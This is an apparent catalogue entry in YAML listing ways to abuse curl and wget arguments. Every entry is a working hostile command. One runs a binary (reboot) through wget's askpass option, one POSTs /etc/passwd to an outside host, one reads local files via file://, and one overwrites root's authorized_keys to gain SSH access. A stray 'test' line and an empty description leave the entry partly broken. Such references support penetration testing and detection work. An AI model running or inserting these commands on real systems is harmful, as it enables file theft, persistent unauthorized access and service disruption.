---
functions:
  command:
    - description: Can be used to execute any command or file on a system, but without any arguments, and without stdout/stderr. This can be useful if you are able to write an executable to the server beforehand. The example here invokes /sbin/reboot.
      code: |
        wget --use-askpass=/sbin/reboot http://0/
  file-upload:
    - description: Send a local file to a remote server in a POST request. Note that the file will be sent as-is.
      code: |
        curl --data @/etc/passwd http://website.com/
        test
  file-read:
    - description: Read local files by using the file:// schema.
      code: |
        curl file:///etc/passwd
  file-write:
    - description: 
      code: |
        curl http://website.com/ -o /tmp/
  file-download:
    - description: Downloads a remote file via an HTTP GET request and saves it to a specific location.
      code: |
        wget --output-document=/root/.ssh/authorized_keys http://0/
---
